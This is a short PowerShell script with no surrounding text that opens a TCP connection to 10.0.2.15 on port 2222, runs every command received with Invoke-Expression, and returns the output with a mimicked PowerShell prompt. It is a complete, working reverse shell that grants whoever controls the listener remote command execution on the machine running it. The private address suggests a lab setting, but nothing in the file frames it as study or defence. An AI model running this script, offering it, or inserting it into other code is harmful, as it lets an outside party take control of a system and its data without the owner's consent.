$client = New-Object System.Net.Sockets.TCPClient("10.0.2.15", 2222)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

try{
[byte[]]$buffer = New-Object byte[] 1024
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String )
    $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
}catch{}
$client.Close()